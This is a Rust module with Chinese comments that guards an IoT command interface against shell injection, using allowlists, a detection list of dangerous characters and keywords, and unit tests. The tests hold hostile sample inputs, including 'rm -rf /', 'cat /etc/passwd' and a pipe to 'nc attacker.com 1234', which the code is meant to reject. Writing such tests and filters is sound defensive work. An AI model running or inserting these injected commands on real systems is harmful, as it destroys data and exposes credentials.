//! 命令注入防护
//!
//! 防止通过 IoT 命令或其他接口执行系统命令注入攻击。

use super::errors::SecurityError;

/// 允许的 IoT 命令白名单
const ALLOWED_COMMANDS: &[&str] = &[
    "turn_on",
    "turn_off",
    "set_brightness",
    "set_temperature",
    "set_color",
    "get_state",
    "toggle",
    "dim",
    "brighten",
    "set_volume",
    "play",
    "pause",
    "stop",
    "next",
    "previous",
    "open",
    "close",
    "lock",
    "unlock",
];

pub struct CommandSanitizer;

impl CommandSanitizer {
    /// 清理设备 ID，防止命令注入
    pub fn sanitize_device_id(id: &str) -> Result<String, SecurityError> {
        // 空检查
        if id.is_empty() {
            return Err(SecurityError::InvalidDeviceId);
        }

        // 长度限制
        if id.len() > 64 {
            return Err(SecurityError::DeviceIdTooLong);
        }

        // 白名单验证：只允许字母、数字、连字符、下划线
        if !id
            .chars()
            .all(|c| c.is_alphanumeric() || c == '-' || c == '_')
        {
            tracing::warn!(device_id = id, "检测到无效的设备 ID");
            return Err(SecurityError::InvalidDeviceId);
        }

        // 检测命令注入模式
        if Self::contains_injection_pattern(id) {
            tracing::warn!(device_id = id, "检测到命令注入攻击");
            return Err(SecurityError::CommandInjectionDetected);
        }

        Ok(id.to_string())
    }

    /// 清理命令名称
    pub fn sanitize_command(cmd: &str) -> Result<String, SecurityError> {
        // 空检查
        if cmd.is_empty() {
            return Err(SecurityError::UnknownCommand(cmd.to_string()));
        }

        // 长度限制
        if cmd.len() > 64 {
            return Err(SecurityError::UnknownCommand(cmd.to_string()));
        }

        // 白名单验证
        if !ALLOWED_COMMANDS.contains(&cmd) {
            tracing::warn!(command = cmd, "未知命令");
            return Err(SecurityError::UnknownCommand(cmd.to_string()));
        }

        Ok(cmd.to_string())
    }

    /// 清理命令参数
    pub fn sanitize_params(params: &serde_json::Value) -> Result<serde_json::Value, SecurityError> {
        // 检查嵌套深度
        if Self::json_depth(params) > 5 {
            return Err(SecurityError::SuspiciousActivity("参数嵌套过深".into()));
        }

        // 检查字符串值中的注入模式
        Self::check_json_for_injection(params)?;

        Ok(params.clone())
    }

    /// 检测命令注入模式
    fn contains_injection_pattern(input: &str) -> bool {
        // Shell 命令注入特征
        let dangerous_chars = ['&', '|', ';', '`', '$', '(', ')', '<', '>', '\n', '\r'];

        for ch in dangerous_chars {
            if input.contains(ch) {
                return true;
            }
        }

        // 检测常见命令注入关键词
        let lower = input.to_lowercase();
        let dangerous_keywords = [
            "rm ", "cat ", "ls ", "cd ", "chmod ", "chown ", "wget ", "curl ", "nc ", "bash ",
            "sh ", "python ", "/bin/", "/usr/", "/etc/", "/tmp/",
        ];

        for keyword in dangerous_keywords {
            if lower.contains(keyword) {
                return true;
            }
        }

        false
    }

    /// 计算 JSON 嵌套深度
    fn json_depth(value: &serde_json::Value) -> usize {
        match value {
            serde_json::Value::Object(map) => {
                1 + map.values().map(Self::json_depth).max().unwrap_or(0)
            }
            serde_json::Value::Array(arr) => {
                1 + arr.iter().map(Self::json_depth).max().unwrap_or(0)
            }
            _ => 0,
        }
    }

    /// 检查 JSON 中的注入模式
    fn check_json_for_injection(value: &serde_json::Value) -> Result<(), SecurityError> {
        match value {
            serde_json::Value::String(s) => {
                if Self::contains_injection_pattern(s) {
                    return Err(SecurityError::CommandInjectionDetected);
                }
            }
            serde_json::Value::Object(map) => {
                for v in map.values() {
                    Self::check_json_for_injection(v)?;
                }
            }
            serde_json::Value::Array(arr) => {
                for v in arr {
                    Self::check_json_for_injection(v)?;
                }
            }
            _ => {}
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_blocks_command_injection_in_device_id() {
        let attacks = vec![
            "light-001; rm -rf /",
            "light-001 && cat /etc/passwd",
            "light-001 | nc attacker.com 1234",
            "light-001`whoami`",
            "light-001$(whoami)",
            "light-001\nrm -rf /",
        ];

        for attack in attacks {
            assert!(
                CommandSanitizer::sanitize_device_id(attack).is_err(),
                "应阻止: {}",
                attack
            );
        }
    }

    #[test]
    fn test_blocks_path_traversal() {
        let attacks = vec![
            "../../etc/passwd",
            "/bin/bash",
            "/usr/bin/curl",
            "/tmp/malicious",
        ];

        for attack in attacks {
            assert!(
                CommandSanitizer::sanitize_device_id(attack).is_err(),
                "应阻止: {}",
                attack
            );
        }
    }

    #[test]
    fn test_allows_valid_device_ids() {
        let valid_ids = vec![
            "light-001",
            "sensor_temp_01",
            "device123",
            "room-1-light",
            "HVAC_unit_A",
        ];

        for id in valid_ids {
            assert!(
                CommandSanitizer::sanitize_device_id(id).is_ok(),
                "应允许: {}",
                id
            );
        }
    }

    #[test]
    fn test_command_whitelist() {
        // 允许的命令
        let allowed = vec!["turn_on", "turn_off", "set_brightness", "get_state"];
        for cmd in allowed {
            assert!(CommandSanitizer::sanitize_command(cmd).is_ok());
        }

        // 不允许的命令
        let blocked = vec!["rm", "cat", "exec", "eval", "system", "unknown_cmd"];
        for cmd in blocked {
            assert!(CommandSanitizer::sanitize_command(cmd).is_err());
        }
    }

    #[test]
    fn test_sanitize_params() {
        // 正常参数
        let normal = serde_json::json!({
            "brightness": 80,
            "color": "red"
        });
        assert!(CommandSanitizer::sanitize_params(&normal).is_ok());

        // 包含注入的参数
        let malicious = serde_json::json!({
            "brightness": "80; rm -rf /"
        });
        assert!(CommandSanitizer::sanitize_params(&malicious).is_err());

        // 嵌套过深
        let deep = serde_json::json!({
            "a": {"b": {"c": {"d": {"e": {"f": {"g": 1}}}}}}
        });
        assert!(CommandSanitizer::sanitize_params(&deep).is_err());
    }

    #[test]
    fn test_empty_input() {
        assert!(CommandSanitizer::sanitize_device_id("").is_err());
        assert!(CommandSanitizer::sanitize_command("").is_err());
    }

    #[test]
    fn test_length_limits() {
        let long_id = "a".repeat(65);
        assert!(CommandSanitizer::sanitize_device_id(&long_id).is_err());

        let ok_id = "a".repeat(64);
        assert!(CommandSanitizer::sanitize_device_id(&ok_id).is_ok());
    }

    #[test]
    fn test_special_characters_blocked() {
        let special_chars = vec![
            "light&001",
            "light|001",
            "light;001",
            "light`001",
            "light$001",
            "light(001)",
            "light<001>",
        ];

        for id in special_chars {
            assert!(
                CommandSanitizer::sanitize_device_id(id).is_err(),
                "应阻止: {}",
                id
            );
        }
    }
}
